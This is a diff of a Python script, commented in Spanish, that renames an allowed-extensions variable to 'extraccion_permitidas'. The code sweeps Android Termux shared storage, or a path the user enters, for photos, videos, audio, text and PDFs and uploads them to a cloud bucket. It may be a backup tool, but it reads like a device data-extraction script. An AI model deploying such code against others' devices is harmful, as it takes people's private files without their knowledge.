@@ -166,7 +166,7 @@ if os.name == 'nt':
         # Obtén la extensión del archivo
         _, extension = os.path.splitext(archivo_local)
         # Verifica si la extensión está permitida
-        if extension in extensiones_permitidas:
+        if extension in extraccion_permitidas:
 
             # Descargar info
             blob = bucket.blob(nombre_destino)
@@ -191,7 +191,7 @@ if os.name == 'nt':
         # Obtén la extensión del archivo
             _, extension = os.path.splitext(archivo_local)
         # Verifica si la extensión está permitida
-            if extension in extensiones_permitidas:
+            if extension in extraccion_permitidas:
 
                 # Sube el archivo
                 blob = bucket.blob(nombre_destino)
@@ -221,7 +221,7 @@ else:
    #Guardando los datos 
     carpeta_local = '/data/data/com.termux/files/home/storage/shared/*'
 # Lista de extensiones permitidas
-    extracciones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
+    extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
     archivos = glob.glob(carpeta_local + '/*')
 
@@ -231,7 +231,7 @@ else:
     # Obtén la extensión del archivo
         _, extension = os.path.splitext(archivo_local)
     # Verifica si la extensión está permitida
-        if extension in extensiones_permitidas:
+        if extension in extraccion_permitidas:
 
             # Sube el archivo
             blob = bucket.blob(nombre_destino)
@@ -248,7 +248,7 @@ else:
         carpeta_local = input(
             'Ingresa Ruta manual\n[+]')
 # Lista de extensiones permitidas
-        extensiones_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
+        extraccion_permitidas = ['.jpg', '.png', '.mp4', '.mp3', '.jpeg', '.txt', '.pdf', '.mvk']
 
         archivos = glob.glob(carpeta_local + '/*')
 
@@ -258,7 +258,7 @@ else:
         # Obtén la extensión del archivo
             _, extension = os.path.splitext(archivo_local)
         # Verifica si la extensión está permitida
-            if extension in extensiones_permitidas:
+            if extension in extraccion_permitidas:
 
                 # Sube el archivo
                 blob = bucket.blob(nombre_destino)
